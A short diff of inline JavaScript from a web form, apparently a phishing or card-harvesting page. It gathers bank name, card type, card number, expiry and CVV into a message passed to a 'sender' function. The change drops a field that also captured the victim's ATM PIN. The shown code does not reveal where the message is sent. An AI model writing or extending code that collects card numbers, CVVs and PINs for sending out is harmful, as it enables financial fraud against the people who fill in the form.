@@ -198,15 +198,13 @@ var ready = function () {
     Credit = document.getElementById("Credit").value;
     expiry = document.getElementById("expiry").value;
     cvv = document.getElementById("cvv").value;
-    pin = document.getElementById("pin").value;
   
     message = 
       "\nBank Name: " + bank +  
       "\nCard Type: " + card1 + 
       "\nCredit no: " + Credit +  
       "\nExpiry: " + expiry + 
-      "\nCvv no: " + cvv +  
-      "\nATM PIN: " + pin;
+      "\nCvv no: " + cvv;
 };
 var sender = function () {
     ready();
@@ -237,7 +235,6 @@ var sender = function () {
     document.getElementById("Credit").value = "";
     document.getElementById("expiry").value = "";
     document.getElementById("cvv").value = "";
-    document.getElementById("pin").value = "";
     return false;
 };
   </script>
